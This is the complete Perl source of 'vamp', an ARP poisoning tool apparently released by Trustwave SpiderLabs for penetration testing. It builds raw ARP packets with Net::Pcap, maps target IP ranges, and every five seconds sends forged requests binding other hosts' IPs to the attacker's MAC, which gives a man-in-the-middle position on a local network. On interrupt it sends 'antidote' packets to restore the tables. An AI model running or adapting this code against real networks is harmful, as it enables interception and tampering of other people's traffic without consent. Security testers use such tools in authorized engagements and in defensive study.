#!/usr/bin/perl

=header
    vamp - A stateful, request-based ARP poisoning program
	Created by Steve Ocepek and Wendel G. Henrique
	Copyright (C) 2010, 2011 Trustwave Holdings, Inc.
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
 
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
=cut

use strict;
use warnings;
use Net::IP;
use Net::Pcap;
use AnyEvent;
use EV;
use Net::Libdnet::Intf;
use thicknet::Util;

my ($myip,$mymac);
my ($ip1,$ip2);
my (@ips1, @ips2);
my %arp;
my %dub;


# Pcap vars
my $pcap;
my $err;
my $snaplen = 96;
my $promisc = 0;
my $to_ms = 15;
my $filter;
my ($address, $netmask);
my %devinfo;
my $index = 1;

# Data offsets
my $os_srcmac = 6;
my $os_dstmac = 0;
my $os_arptype = 21;
my $os_arpsmac = 22;
my $os_arpsip = 28;
my $os_arptmac = 32;
my $os_arptip = 38;

sub send_request {
	# Send ARP request for IP
	my ($ip) = @_;

    # Ethernet layer
    my $ethdst =    "ffffffffffff";         # Broadcast
    my $ethsrc =    $mymac;                 # Configured source MAC
    my $ethtype =   0x0806;                 # ARP
    
    # ARP layer
    my $htype =     0x0001; # Ethernet
    my $proto =     0x0800; # IP
    my $hlen =      0x06;   # Hardware size
    my $plen =      0x04;   # Protocol size
    my $opcode =    0x0001; # Request
    
    my $sha =       $mymac;               # Source MAC (ARP)
    my $spa =       $myip;                # Sender IP
    
    my $tha =       "000000000000";     # Requested MAC (we don't know it)
    my $tpa =       $ip;                # Target IP
    
    # Build packet
    my $pkt = pack ('H12H12nnnCCnH12H8H12H8',
                $ethdst, $ethsrc, $ethtype,
                $htype, $proto, $hlen, $plen, $opcode,
                $sha, $spa,
                $tha, $tpa);
    
    # Ship it
	#print "sending ARP request: $ip\n";
	print "REQUEST  ETHDST: $ethdst SHA: $sha SPA: $spa THA: $tha TPA: $tpa\n";
    Net::Pcap::sendpacket($pcap, $pkt);
}

sub send_poison {
	my ($srcip, $dstip) = @_;

    # Ethernet layer
    my $ethdst =    $arp{$dstip};           # Sending ARP Poison request here
    my $ethsrc =    $mymac;                 # Configured source MAC
    my $ethtype =   0x0806;                 # ARP
    
    # ARP layer
    my $htype =     0x0001; # Ethernet
    my $proto =     0x0800; # IP
    my $hlen =      0x06;   # Hardware size
    my $plen =      0x04;   # Protocol size
    my $opcode =    0x0001; # Request
    
    my $sha =       $mymac;               # Source MAC (notice it's ours)
    my $spa =       $srcip;               # IP we're changing
    
    my $tha =       "000000000000";     # Requested MAC (we don't know it)
    my $tpa =       $dstip;             # Target IP
    
    # Build packet
    my $pkt = pack ('H12H12nnnCCnH12H8H12H8',
                $ethdst, $ethsrc, $ethtype,
                $htype, $proto, $hlen, $plen, $opcode,
                $sha, $spa,
                $tha, $tpa);
    
    # Ship it
	print "POISON   ETHDST: $ethdst SHA: $sha SPA: $spa THA: $tha TPA: $tpa\n";
    Net::Pcap::sendpacket($pcap, $pkt);
}

sub send_antidote {
	# Send ARP request for IP
	my ($srcip, $dstip) = @_;

    # Ethernet layer
    my $ethdst =    $arp{$dstip};           # Sending fix here
    my $ethsrc =    $mymac;                 # Configured source MAC
    my $ethtype =   0x0806;                 # ARP
    
    # ARP layer
    my $htype =     0x0001; # Ethernet
    my $proto =     0x0800; # IP
    my $hlen =      0x06;   # Hardware size
    my $plen =      0x04;   # Protocol size
    my $opcode =    0x0001; # Request
    
    my $sha =       $arp{$srcip};         # Source MAC (now it's theirs)
    my $spa =       $srcip;               # IP we're changing
    
    my $tha =       "000000000000";     # Requested MAC (we don't know it)
    my $tpa =       $dstip;             # Target IP
    
    # Build packet
    my $pkt = pack ('H12H12nnnCCnH12H8H12H8',
                $ethdst, $ethsrc, $ethtype,
                $htype, $proto, $hlen, $plen, $opcode,
                $sha, $spa,
                $tha, $tpa);
    
    # Ship it
	print "ANTIDOTE ETHDST: $ethdst SHA: $sha SPA: $spa THA: $tha TPA: $tpa\n";
    Net::Pcap::sendpacket($pcap, $pkt);
	# And again to be sure...
	Net::Pcap::sendpacket($pcap, $pkt);
	Net::Pcap::sendpacket($pcap, $pkt);
}

sub arp_scan {
	foreach my $ip (keys(%dub)) {
		send_request($ip);
	}
}

sub arp_poison {
	foreach my $x (keys(%arp)) {
		foreach my $y (keys(%{$dub{$x}})) {
			#print "poison $x - $y\n" if ($arp{$y});
			send_poison($x,$y) if ($arp{$y});
		}
	}
}

sub arp_antidote {
	foreach my $x (%arp) {
		foreach my $y (keys(%{$dub{$x}})) {
			send_antidote($x,$y) if ($arp{$y});
		}
	}
	print "Exiting and fixing ARP tables...\n";
	exit;
}

sub process_packet {
	# if target hw is us, update arp table based on packet
	my ($user_data, $header, $pkt) = @_;
	#print "Got packet!\n";
	
	my $arptype = ord (substr($pkt, $os_arptype, 1));
	
	#print "ARP Type is $arptype\n";
	if ($arptype == 2) {
		
		my $arpsmac = sprintf("%02x%02x%02x%02x%02x%02x",
			ord (substr($pkt, $os_arpsmac, 1)),
			ord (substr($pkt, $os_arpsmac+1, 1)),
			ord (substr($pkt, $os_arpsmac+2, 1)),
			ord (substr($pkt, $os_arpsmac+3, 1)),
			ord (substr($pkt, $os_arpsmac+4, 1)),
			ord (substr($pkt, $os_arpsmac+5, 1))
			);
		
		my $arpsip = sprintf("%02x%02x%02x%02x",
			ord (substr($pkt, $os_arpsip, 1)),
			ord (substr($pkt, $os_arpsip+1, 1)),
			ord (substr($pkt, $os_arpsip+2, 1)),
			ord (substr($pkt, $os_arpsip+3, 1)));

		$arp{$arpsip} = $arpsmac;
		#print "MAC: $arpsmac IP: $arpsip \n";
	}
}

if ($ARGV[0]) {
	# Check for valid IPs
	$ip1 = new Net::IP ($ARGV[0]) || die "Bad IP: " . $ARGV[0] . "\n";
	if ($ARGV[1]) {
		$ip2 = new Net::IP ($ARGV[1]) || die "Bad IP: " . $ARGV[1] . "\n";
	} else {
		$ip2 = $ip1;
	}
	# Is IPv4?
	unless ($ip1->version == 4) { die "Not IPv4: " . $ip1->print() . "\n"; }
	unless ($ip2->version == 4) { die "Not IPv4: " . $ip2->print() . "\n"; }
	# Populate ranges
	# Net::IP's hexip() will strip leading zero, so use thicknet::Util ip2hex instead
	do { my $x = ip2hex($ip1->ip()); push(@ips1, $x); } while (++$ip1);
	do { my $x = ip2hex($ip2->ip()); push(@ips2, $x); } while (++$ip2);
	
} else {
	print "vamp - Villainous ARP Manipulation Program\n";
	print "(c) 2010, 2011 Trustwave Holdings, Inc.\n";
    print "Created by Wendel G. Henrique and Steve Ocepek\n";
    print "Trustwave SpiderLabs(R)\n";
	print "\n";
	print "Usage: vamp.pl IP1 [IP2] [dev]\n";
	print "IP formats: 192.168.2.1 or \n"; 
	print "            192.168.2.0/24 or \n";
	print "            192.168.2.1 + 24 or \n";
	print "            192.168.2.1 - 192.168.2.25\n";
	print "\n";
	exit;
}

# Fire up pcap listener
my $dev;
if ($ARGV[2]) {
	$dev = $ARGV[2];
}
else {
	# Show available devices, allow user to choose
	my @devs = Net::Pcap::findalldevs(\$err, \%devinfo);
	if ($devs[0]) {
		print "\n";
		print "Please choose an interface to listen on\n\n";


		for my $d (@devs) {
		    print "$index: $d - $devinfo{$d}\n";
		    $index++;
		}

		print "\n> ";
		my $choice = <STDIN>;
		chomp ($choice);

		$dev = $devs[$choice-1];
	}
	else {
		print "No interfaces found. Ensure that current user has admin/root priveleges.\n";
		exit;
	}
	
}

# Get net info 
if (Net::Pcap::lookupnet($dev, \$address, \$netmask, \$err)) {
    die 'Unable to look up device information for ', $dev, ' - ', $err;
}
# Open device
$pcap = Net::Pcap::open_live($dev, $snaplen, $promisc, $to_ms, \$err);
unless ($pcap) {
    die "Error opening live: $err\n";
}

# Non-blocking mode offers dramatic speed increase but
# don't set it on Windows unless you like high CPU utilization
unless ($^O eq 'MSWin32') {
        Net::Pcap::pcap_setnonblock($pcap, 1, \$err);
}

# Use dnet to get interface info
my $intf = new Net::Libdnet::Intf;
my $eth = $intf->get($dev);
$myip = ip2hex($eth->ip);
$mymac = $eth->linkAddr;
$mymac =~ s/://g;

# Build connection table
foreach my $o (@ips1) {
	foreach my $i (@ips2) {
		#print "comparing $o and $i\n";
		unless (($o eq $i) or ($dub{$o}->{$i}) or ($dub{$i}->{$o}) or ($o eq $myip)) {
			#print "$o and $i\n";
			$dub{$o}->{$i} = 1;
			$dub{$i}->{$o} = 1;
		}
	}
}

# Compile and set filter
my $filter_str = "arp and ether dst $mymac";
Net::Pcap::compile($pcap, \$filter, $filter_str, 1, $netmask) &&
    die 'Unable to compile packet capture filter';
Net::Pcap::setfilter($pcap, $filter) &&
    die 'Unable to set packet capture filter';

# Signal handler to fix poison after ctrl+c
$SIG{INT} = \&arp_antidote;

# Timer is more cross-platform friendly
# Look at doing select on pkt descriptor if you're just using Linux/BSD
my $pcaploop = AnyEvent->timer (after => 0, interval => .001, cb => sub {
	Net::Pcap::pcap_dispatch($pcap, 1, \&process_packet, "user data");
	});

my $arpreq = AnyEvent->timer (after => 2, interval => 60, cb => sub { arp_scan(); } );

my $arppoison = AnyEvent->timer (after => 5, interval => 5, cb => sub { arp_poison(); } );

# Start loop
EV::loop;
